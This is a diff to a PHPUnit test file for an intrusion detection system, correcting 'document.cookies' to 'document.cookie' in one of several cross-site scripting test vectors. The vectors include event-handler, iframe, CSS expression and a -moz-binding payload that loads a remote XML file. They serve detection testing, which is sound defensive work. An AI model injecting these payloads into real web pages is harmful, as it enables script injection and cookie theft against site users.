@@ -1314,7 +1314,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
     public function testAllowedHTMLScanningPositive() {
 
         $exploits = array();
-        $exploits['html_1'] = '<a/onmouseover=alert(document.cookies) href="http://www.google.de/">Google</a>';
+        $exploits['html_1'] = '<a/onmouseover=alert(document.cookie) href="http://www.google.de/">Google</a>';
         $exploits['html_2'] = '<table width="500"><tr><th>Test</th><iframe/onload=alert(1)> </tr><tr><td>test</td></tr></table>';
         $exploits['html_3'] = '<a style="background:url(//lo/)}lo:expression\(alert(1)));">lo</a>';
         $exploits['html_4'] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
